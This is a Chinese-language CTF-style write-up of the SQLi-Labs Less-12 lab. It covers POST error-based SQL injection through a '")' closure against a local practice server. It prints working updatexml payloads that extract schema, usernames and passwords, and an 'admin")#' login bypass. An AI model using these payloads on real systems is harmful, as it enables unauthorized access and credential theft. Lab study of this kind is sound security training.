SQLi-Labs Less-12

2026年9月26日 SQLi-Labs Web安全 SQL注入 POST报错注入

一、题目信息

  • 题目名称：SQLi-Labs Less-12 (POST - Error Based - Double quotes- String - with twist)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / POST型报错注入 / 双引号加括号闭合
  • 靶场链接：http://localhost:8081/Less-12/（本地环境）
  • 涉及工具：Chrome浏览器 (F12开发者工具)

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于双引号加括号闭合的 POST 型报错注入。Less-11 使用的是单引号闭合，而 Less-12 官方标记了 "with twist"（有小把戏），这个"把戏"就是指后端代码不仅仅用了双引号，还套了一层括号。攻击者必须使用 ") 来闭合前面的语法，然后利用 updatexml 报错函数回显数据。同时，还需要绕过字符集冲突和报错截断等坑。

2. 怎么想（破题思路）

  • 先输入 admin'，页面报错，说明存在注入，但可能闭合方式不对。
  • 输入 admin")，页面再次报错，但报错信息中泄露了闭合结构，确认漏洞存在。
  • 使用报错函数 updatexml 构造 payload，一步步爆出库名、表名、字段名和数据。
  • 如果只是为了通关，可以直接使用万能密码 admin")# 绕过密码验证。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：盲猜闭合符号失败（with twist 的陷阱）

踩坑情况：按照 Less-11 的经验直接输入 admin'，页面报错，但加上 # 注释后依然报错，无法注入。

原因分析：Less-12 的 SQL 语句是 WHERE username=("$username")，不仅有双引号，还有一个括号。只闭合单引号或双引号都不够。这就是所谓的 "with twist"。

改进方式：尝试闭合双引号和括号 admin")。提交后，页面的报错信息变为 near '") and password=("123") LIMIT 0,1'，成功确认闭合方式为 ")。

踩坑记录二：获取表名时出现字符集排序冲突报错

踩坑情况：输入 admin") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)# 时，页面报错：Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation '='。

原因分析：MySQL 系统自带的 information_schema 库默认字符集是 gbk，而靶场数据库是 latin1。当两者进行比较（table_schema='security'）时，发生了字符集冲突。

改进方式：把字符串硬编码改为十六进制形式，或者使用 database() 函数替代 'security'。例如写 table_name=0x7573657273（0x 是十六进制前缀，7573657273 是 users 的十六进制编码），这样就能完美绕过字符集冲突。

踩坑记录三：updatexml 回显长度截断问题

踩坑情况：查密码时，页面报错显示 XPATH syntax error: '~'。

原因分析：updatexml 报错回显的最大限制是 32 个字符。密码的 MD5 值刚好 32 位，加上边界符号 ~ 会导致超长截断，或者数据被截断显示不全。

改进方式：使用 substr() 函数分段截取。例如 substr((select password from users limit 0,1),1,30) 截取前 30 位，再 substr(...,31,32) 截取后 2 位，拼接即可。或者干脆使用偷懒终极方法：万能密码登录。

详细实操步骤（Payload逐字解释）

第一步：探测闭合方式

Username 输入 admin")，Password 随便填。报错 near '") and password=("123") LIMIT 0,1'，说明闭合成功，后端语句类似 SELECT * FROM users WHERE username=("admin") AND password=("123") LIMIT 0,1;。

第二步：获取数据库名

admin") and updatexml(1,concat(0x7e,(select database()),0x7e),1)#

逐字解析：

  • admin")：闭合原有 SQL 语句中的 username=("，使得后面的代码能被当作 SQL 指令执行。
  • and：逻辑与，连接闭合后的语句和我们的注入语句。
  • updatexml(1, XPath格式字符串, 1)：MySQL 用于更新 XML 的函数。当第二个参数不符合 XPath 语法时，会抛出错误并显示这个字符串。这是报错注入的核心。
  • concat(0x7e, (select database()), 0x7e)：concat 拼接字符串。0x7e 是波浪号 ~ 的十六进制，用作边界标识。中间的 (select database()) 是获取当前库名的子查询。
  • #：注释符，把原 SQL 剩下的 ") AND password=("...") LIMIT 0,1; 全部注释掉，保持语法闭合。

回显：XPATH syntax error: '~security~'，成功拿到数据库名！

第三步：获取表名

admin") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#

回显 ~emails~。接着查第二个表，将 limit 0,1 改为 limit 1,1，或者直接查目标表：

admin") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#

回显 ~users~。注意这里使用了十六进制 0x7573657273 来规避字符集冲突。

第四步：获取字段名

admin") and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),0x7e),1)#

把 tables 换成 columns，依次把 limit 0,1 改为 1,1、2,1，拿到字段名：id、username、password。

第五步：获取数据与通关

-- 拿用户名
admin") and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#
-- 拿密码（分段截取防截断）
admin") and updatexml(1,concat(0x7e,substr((select password from users limit 0,1),1,30)),1)#

成功拿到 Dumb/Dumb 或 admin/admin。最后回到登录框，Username 填 Dumb，Password 填 Dumb，成功登录。

终极逃课法（万能密码）：直接在 Username 输入 admin")#，Password 随便填，点击 Submit。因为 # 把后面的密码验证全注释了，SQL 变成 SELECT * FROM users WHERE username=("admin")#，直接登录成功。

4. 怎么迁移（跨领域联想）

  • 代码审计：") 这种看起来多此一举的闭合方式，在 PHP 代码里通常是因为开发者写了 WHERE username=('$username') 这种冗余的括号。在代码审计中，看到这种非标准写法往往意味着存在特殊的注入方式，需要特别留意。
  • API 接口安全：在 RESTful API 中，POST 请求体（JSON/XML）也可能被拼接进 SQL。测试接口时，注入思路与 POST 表单类似，都需要考虑各种引号和括号的闭合组合。
  • 逻辑漏洞防范：万能密码之所以生效，根本原因是后端把用户输入当成了 SQL 代码。解决的终极办法是使用参数化查询（Prepared Statements），确保代码和数据分离。

三、名词大全与原理深度复盘

1. with twist（小把戏）

SQLi-Labs 靶场的一个幽默说法，特指 Less-12 在闭合方式上做了变化，从 Less-11 的单引号变成了双引号加括号 ")，增加了新手盲猜的难度。

2. POST 注入

数据通过 HTTP 请求体（Request Body）发送。一般出现在登录框、注册框等需要提交表单的地方。与 GET 注入的区别在于，POST 注入无法直接在 URL 修改，必须使用抓包工具或开发者工具修改请求体。

3. 报错注入（Error-Based）

利用数据库执行错误时抛出的信息，将想要查询的数据通过非法格式（如调用 updatexml）拼接在错误信息中带出来。是一种非常高效的数据回显方式。

4. updatexml() 与 32字节回显限制

updatexml(XML_document, XPath_string, new_value) 第二个参数必须是合法的 XPath 格式。当传入类似 ~security~ 的字符串时，MySQL 报错并抛出它。回显上限为 32 字节，所以如果数据过长（如 32 位 MD5），需要用 substr() 分段截取。

5. information_schema 数据库

MySQL 自带的一个元数据数据库。它里面存储了所有数据库、表、列的名字。常用的两张表是 tables 和 columns。攻击者通过查询这张表，就能摸清整个数据库的架构。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-11 的区别：Less-11 是单引号闭合（admin'），Less-12 是双引号加括号闭合（admin")）。这就是官方说的 "with twist"。
  • 与 Less-1~10 的区别：Less-1 到 Less-10 都是 GET 请求，Less-11 和 Less-12 变成了 POST 请求，数据提交方式发生了改变。

2. 这种题目的出现原因（为什么存在）

开发者写 SQL 语句时，出于习惯或者思维惯性，写出了 WHERE username=("$username") 这样冗余的代码。虽然看起来只是加了双引号和括号，但对于 SQL 解析器来说，闭合规则变了。这警示我们：安全防御不能靠隐藏闭合符号，而应该在数据进入数据库之前进行严格的类型检查和参数化处理。

3. 这种应用在实际中如何体现？

在实际渗透测试中，拿到一个 POST 登录接口，通常会用 Burp Suite 抓包，保存为 req.txt，然后用 SQLMap 进行自动化注入测试（sqlmap -r req.txt），这只是基础。如果遇到 WAF 拦截，就需要手工构造各种花式的闭合语句（如 '), ")) 等）来尝试绕过。

4. 如何抽象理解概念（大白话）

把数据库比作一个“严格的门卫”：

  • Less-11 的门卫要求暗号是单引号 '。
  • Less-12 的门卫换了个规矩，暗号变成了双引号加括号 ")。
  • 如果你给的是单引号，他不认识，直接把你轰出去（报错，无法注入）。只有给对了 ")，他才会和你说话。这就像是 "with twist" 小把戏，测试的是渗透人员面对变化时的灵活应变能力。
